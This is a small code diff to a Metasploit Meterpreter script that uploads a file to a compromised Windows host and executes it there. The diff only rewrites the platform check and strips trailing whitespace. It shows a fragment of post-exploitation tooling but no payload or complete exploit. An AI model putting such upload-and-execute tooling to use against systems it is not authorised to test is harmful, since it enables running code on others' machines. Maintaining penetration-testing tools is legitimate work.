@@ -93,7 +93,7 @@ def unsupported
   print_error("This version of Meterpreter is not supported with this Script!")
   raise Rex::Script::Completed
 end
-unsupported if client.platform !~ /win32|win64/i
+unsupported if client.platform != 'windows'
 #parsing of Options
 file = ""
 cmdopt = nil
@@ -132,7 +132,7 @@ print_status("Running Upload and Execute Meterpreter script....")
 exec = upload(session,file,path)
 if sleep_sec
   print_status("\tSleeping for #{sleep_sec}s...")
-  Rex.sleep(sleep_sec) 
+  Rex.sleep(sleep_sec)
 end
 cmd_on_trgt_exec(session,exec,cmdopt,verbose)
 if remove == 1
